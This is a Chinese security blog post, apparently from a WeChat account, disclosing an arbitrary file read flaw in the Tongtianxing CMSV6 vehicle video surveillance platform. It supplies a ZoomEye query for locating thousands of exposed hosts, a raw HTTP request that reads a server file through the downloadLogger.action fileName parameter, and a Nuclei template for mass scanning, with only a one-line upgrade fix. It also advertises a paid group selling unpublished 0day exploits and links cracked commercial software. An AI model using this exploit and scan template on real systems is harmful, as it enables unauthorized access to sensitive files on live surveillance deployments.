#  通天星CMSV6车载视频监控平台Logger接口任意文件读取漏洞|漏洞预警   
原创 漏洞挖掘  渗透安全HackTwo   2024-04-17 00:02  
  
###   
#   
0x01 产品简介  
          
  
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司Q研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等  
。  
这里我推荐利用 **ZoomEye**  
****搜索引擎直接输入关键字即可，影响资产13000+  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5atFnxY05ssGIoff30UcjWQ3TQ9xl8rgibwfibU1ibqLMPUuCbj0A2ibtZ5FXbsGrxr9CGWeI31xZZrA/640?wx_fmt=png&from=appmsg "")  
  
**声明******  
  
> 请自行搭建环境进行漏洞测试，该公众号或作者星球分享的工具、项目、漏洞仅供安全研究与学习之用请勿用于非法行为，如用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
  
  
**TIPS:**  
**末尾领取资料及福利-批量检测脚本在末尾**  
  
0x02 漏洞描述       任意文件读取漏洞（Arbitrary File Read or File Disclosure）是一种安全漏洞，它允许攻击者读取应用程序服务器上的任意文件。这通常发生在应用程序未能正确验证用户输入，特别是涉及文件操作的地方。如果攻击者能够操纵这些输入，它们可能会绕过安全限制，访问或“泄露”本应受保护的文件，这些文件可能包含敏感数据、配置信息、源码、加密密钥或其他重要资料。0x03 ZoomEye语法app:"通天星 CMSV6"0x04 漏洞复现POCGET /808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini HTTP/1.1Host: {}Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: language=zh; style=1; EnableAESLogin=0; maintitle=%u4E3B%u52A8%u5B89%u5168%u76D1%u63A7%u4E91%u5E73%u53F0; isPolice=0; JSESSIONID=667DE4425CAA5DF57E89336C35C703F9Connection: closeNuclei批量检测POC（请自行搭建环境检测）id: tongtianxing-Logger-readfileinfo:  name: tongtianxing-Logger-readfile  author: HackTwo  severity: high  description: |    漏洞测试-Read  reference:    - https://127.0.0.1  tags: autohttp:  - raw:      - |        GET /808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini HTTP/1.1        Host: {{Hostname}}        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36        Accept-Encoding: gzip, deflate, br        Accept-Language: zh-CN,zh;q=0.9b        Connection: close    matchers:      - type: dsl        dsl:          - status_code==200 && contains_all(body,"[Mail]")0x05 修复建议官方已经推出新版本，建议升级到最新版0x06 知识星球-V1.3内部VIP星球介绍需要加入内部知识星球可点击下方链接，资源包含但不限于网上未公开的1day/0day漏洞2024 更新漏洞POC共950+2024最新SRC/CNVD/Edu实战挖掘技巧报告，红队内网横向渗透，代码审计，JS逆向，SRC培训等课程。圈子对新人友好，加入圈子拥有FOFA shadan 360Quake ZoomEye Tide 零零信安 Hunter Ctfshow等等高级会员账号，SRC文档，武器库。圈子里面资料价值至少在10K以上，目前星球内部主题600+，资源2000+，其他和网盘资源1w+并持续更新中，越早加入价格越低(详情点击下方地址了解-->>还是觉得价格贵的师傅后台回复" 星球 "有优惠券使用名额有限先到先得)👉点击了解-->>>>内部VIP知识星球福利介绍V1.3版本-星球介绍近期更新的0day/1day(包含公开和未公开漏洞-仅列举部分)漏洞整理已更新至900+需要的加入星球获取一些漏洞报告200+(仅列举部分)加入星球获取更多资源及视频资源持续更新中！  
  
**结尾**  
  
# 免责声明  
  
  
# 获取方法  
  
  
回复“**app**  
" 获取  app渗透和app抓包教程  
  
回复“**渗透字典**" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。  
  
回复“**书籍**" 获取 网络安全相关经典书籍电子版pdf  
  
压缩包解压密码：HackTwo  
  
  
  
# 免责声明  
  
  
        
文章中的案例或工具仅面向合法授权的企业安全建设行为，如您需要测试内容的可用性，请自行搭建靶机环境，勿用于非法行为。如  
用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用。  
如您在使用本工具或阅读文章的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。  
本工具或文章或来源于网络，若有侵权请联系作者删除，请在24小时内删除，请勿用于商业行为，自行查验是否具有后门，切勿相信软件内的广告！  
  
  
  
# 往期推荐  
  
  
**1. 内部VIP知识星球福利介绍V1.3版本**  
  
**2. 最新BurpSuite2023.12.1专业版中英文版下载**  
  
**3. 最新Nessus2024下载Windows/Linux**  
  
[4. 最新xray1.9.11高级版下载Windows/Linux](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483882&idx=1&sn=e1bf597eb73ee7881ae132cc99ac0c8e&chksm=cf16a75af8612e4c73eda9f52218ccfc6de72725eb37aff59e181435de095b71e653b446c521&scene=21#wechat_redirect)  
  
  
[5. 最新HCL AppScan Standard 10.4.128273破解版下载](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483850&idx=1&sn=8fad4ed1e05443dce28f6ee6d89ab920&chksm=cf16a77af8612e6c688c55f7a899fe123b0f71735eb15988321d0bd4d14363690c96537bc1fb&scene=21#wechat_redirect)  
  
  
  
###### 渗透安全HackTwo  
  
  
微信号：关注公众号获取  
  
后台回复星球加入：  
知识星球  
  
扫码关注 了解更多  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq6qFFAxdkV2tgPPqL76yNTw38UJ9vr5QJQE48ff1I4Gichw7adAcHQx8ePBPmwvouAhs4ArJFVdKkw/640?wx_fmt=png "二维码")  
  
  
  
喜欢的朋友可以点赞转发支持一下  
  
  
